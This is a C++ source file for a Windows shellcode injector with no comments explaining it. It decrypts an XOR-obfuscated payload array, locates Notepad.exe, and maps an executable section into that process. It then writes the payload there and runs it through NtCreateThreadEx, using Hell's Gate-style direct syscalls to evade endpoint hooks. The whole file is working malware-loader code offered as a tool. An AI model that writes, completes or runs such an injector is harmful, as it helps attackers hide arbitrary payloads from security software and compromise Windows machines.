#include<Windows.h>
#include <iostream>
#include<TlHelp32.h>
#include"encryption.h"
#include"structures.h"
#include"HellsGate.h"
unsigned char payload[] = { 0x96,0x9F,0x09,0xBA,0x85,0x0A,0x75,0x3A,0x08,0xF6,0xA0,0x35,0xCF,0x13,0xF1,0x12,0x42,0x87,0xBA,0xBE,0x16,0xDA,0x04,0xCC,0x5F,0xC7,0x5E,0x91,0x3A,0x45,0xDB,0x84,0xF3,0xE8,0xDD,0xFE,0x2E,0x01,0xE1,0x76,0xAA,0x4D,0xDC,0x20,0x83,0xFB,0x42,0x40,0xFB,0x68,0x91,0x6B,0xE5,0x46,0xFE,0xEE,0x49,0xDE,0x2B,0x94,0x15,0x51,0x37,0xE3,0xEC,0x8C,0x6D,0xD3,0x3C,0xFE,0xEF,0x79,0xAA,0xAB,0xE8,0xB3,0xF6,0x34,0x13,0xA8,0x80,0xAB,0xF1,0x41,0x5B,0x32,0x5A,0x14,0x9F,0x20,0x94,0xC0,0x71,0x5C,0x86,0x51,0x20,0x0A,0xC0,0xA8,0xC4,0xC0,0x50,0xA9,0xCD,0x0E,0x8F,0x68,0x4E,0x7D,0x5E,0xF3,0xF6,0x30,0xA3,0x4B,0xED,0x83,0x74,0xDA,0xB2,0x3E,0xA0,0x25,0xFB,0x1F,0xD5,0xD8,0x8A,0x49,0xE0,0x71,0x4D,0x5C,0x5B,0x43,0x91,0x7F,0xE0,0x40,0xFD,0xE9,0x83,0x9B,0x8B,0xBE,0xAE,0x10,0xF0,0x2D,0xA5,0xE8,0x64,0xDD,0x7B,0x7A,0x46,0x5A,0xD4,0x9E,0xDB,0x97,0x79,0x55,0xA2,0xB2,0x0B,0xF0,0x93,0xC4,0xA9,0xDE,0x2E,0xE0,0x13,0x28,0xFC,0x4E,0xA0,0x0C,0x0D,0x0A,0xA9,0x80,0x1C,0xAB,0xFE,0xB2,0x3C,0xEB,0x44,0x4A,0x96,0xE0,0x56,0xE0,0x76,0xAF,0x65,0x6B,0x92,0x2F,0xD3,0x74,0x03,0xD3,0xE3,0xF0,0x1A,0x91,0x21,0x12,0x8B,0xAD,0x15,0x59,0x39,0xCE,0x40,0x50,0xA7,0xF2,0x86,0x8F,0x24,0xE6,0x0D,0x94,0x74,0x8D,0x1C,0x60,0x18,0x88,0xB1,0x11,0x37,0xCC,0xBB,0xBD,0xD5,0xDB,0x29,0x96,0xC4,0x90,0x08,0x47,0x30,0xD3,0x08,0x62,0xBC,0x8A,0x2E,0xF9,0xAF,0xEF,0xA0,0x25,0x05,0x83,0x5D,0x5B,0xA5,0x76,0x82,0x4A,0x00,0x3F,0x75,0x32,0x03,0xD8,0x6A,0xFF,0x0F,0xA2,0xC8,0xF3,0x9B,0x3A,0x44,0x49,0xAA,0x8A,0xE8,0x3C,0x9C,0x1F,0xD7,0xE5,0x70,0x68,0x36,0x42,0x59,0xFE,0xC8,0xE1,0x4D,0xB3,0x34,0x09,0xFD,0x97,0x64,0x3B,0x9B,0xD0,0xDD,0x19,0x5F,0x01,0x23,0x9E,0x9F,0x0B,0xFC,0x6D,0x3A,0xBE,0x59,0x3A,0x4B,0xEC,0xAA,0xE0,0x5A,0x90,0xB9,0x88,0xA7,0x03,0x08,0x60,0xE6,0xC2,0xD9,0x10,0xB2,0x58,0x9D,0xAA,0xE4,0x63,0x5E,0x31,0x44,0xE4,0x5C,0xE0,0x40,0xD1,0x17,0xFF,0x37,0xEC,0x19,0x82,0x23,0xCA,0xB8,0x92,0x2B,0x7B,0xCB,0x38,0xD8,0x04,0xE4,0xEA,0x75,0x54,0xEF,0xF8,0x80,0x7F,0xF8,0xE1,0x55,0x93,0x47,0x94,0x33,0x10,0xB2,0xBA,0xF4,0xDF,0xF0,0xC0,0xE3,0x30,0xB8,0x5F,0x18,0xBC,0xA0,0x06,0xDE,0x27,0x81,0x00,0x5E,0x07,0xFE,0xE0,0xA5,0x81,0xC0,0xCA,0x94,0x5A,0x51,0x80,0xE8,0x17,0x00,0x39,0x84,0x32,0xB4,0xC4,0x8C,0xDE,0xD7,0xEA,0x23,0x55,0x58,0x78,0x4B,0xF4,0xEB,0x9A,0x67,0xF9,0x45,0xD6,0x4D,0xF8,0x57,0xB5,0xB3,0x9A,0x20,0x98,0xB4,0x13,0xFB,0xB4,0x84,0x3E,0x57,0x8F,0x8C,0xFF,0x96,0xD4,0x56,0xBA,0xA0,0xB1,0x62,0xF6,0x15,0xFD,0x11,0x58,0xB0,0xD6,0xA7,0x98,0x89,0xB7,0xE6,0x97,0x52,0x0E,0x50,0x16,0x8B,0xF8,0xD6,0xF6,0xB1,0x4F,0x20,0x83,0x77,0x38,0xED,0xB5,0x36,0xE9,0xA3,0x48,0xE4,0x39,0x95,0x92,0x2D,0xE6 };
unsigned char key[] = "\xde\xad\xbe\xef";

extern "C" NTSTATUS NtCreateSection(PHANDLE,ULONG,POBJECT_ATTRIBUTES,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
//extern "C" NTSTATUS NtMapViewOfSection(HANDLE ,BOOLEAN, PLARGE_INTEGER);
extern "C" NTSTATUS NtCreateThreadEx(PHANDLE,ACCESS_MASK , POBJECT_ATTRIBUTES,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PPS_ATTRIBUTE_LIST);
extern "C" NTSTATUS NtWaitForSingleObject(HANDLE ,BOOLEAN, PLARGE_INTEGER);

extern "C" void SetValue(DWORD);







int main()
{


    //DWORD hash = 0;
    //hash=HASHER((char*)"NtAllocateVirtualMemory");
    //wchar_t test[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
    //PVOID mem=modulebase(test);
   // GetExportfunc((HMODULE)mem,hash);
    WCHAR ntdll[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
    //PVOID membase=modulebase(ntdll);
    //PVOID pNtcreate = GetExportfunc((HMODULE)ntdll);
    //myGetProcAddress((HMODULE)ntdll, "NtCreateSection");
    //myGetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    /*GetModuleaddress((HMODULE)modulebase(ntdll), "NtCreateSection");
    */
    
    Xor_payload(payload,sizeof(payload), key,sizeof(key));
   
   
    HANDLE section = NULL;
    LARGE_INTEGER sectionsize = {0};
    sectionsize.HighPart= 0;
    sectionsize.LowPart = sizeof(payload);
    PVOID mem = NULL;
    SIZE_T ssize = 0;

    HANDLE hproc = NULL;
    HANDLE th=NULL;
    
    DWORD pid=0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
  
    
    
    
    
    
    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snap, &pe)) {
        do
        {
            if (wcscmp(pe.szExeFile, L"Notepad.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }




     hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    //section_besaz NtCreateSection = (section_besaz)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    //UINT_PTR pNtcreate= (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
     PVOID pNtcreate = GetModuleaddress((HMODULE)modulebase(ntdll), (char*)"NtCreateSection");
    DWORD pNtCreateSection = ((unsigned char*)(UINT_PTR)pNtcreate + 4)[0]; //4A
    SetValue(pNtCreateSection);
    NtCreateSection(&section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionsize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    


    mapkon NtMapViewOfSection = (mapkon)GetProcAddress(GetModuleHandleA("ntdll.dll"), (char*)"NtMapViewOfSection");
    NtMapViewOfSection(section, hproc, &mem, 0, 0, 0, &ssize, 2, 0, PAGE_EXECUTE_READWRITE);




    writekon NtWriteVirtualMemory= (writekon)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    NtWriteVirtualMemory(hproc, mem, payload, sizeof(payload), 0);


   
    //threadsaz NtCreateThreadEx = (threadsaz)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    //WORD *test=(WORD*)(NtCreateThreadEx+)
    NtCreateThreadEx(&th, THREAD_ALL_ACCESS, 0, hproc, mem, 0, 0, 0, 0, 0, 0);
    //th = CreateRemoteThread(hproc, 0, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);


    //waitt  NtWaitForSingleObject = (waitt)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
    NtWaitForSingleObject(th, FALSE,0);



    printf("[+]Done!");
    return 0;
}
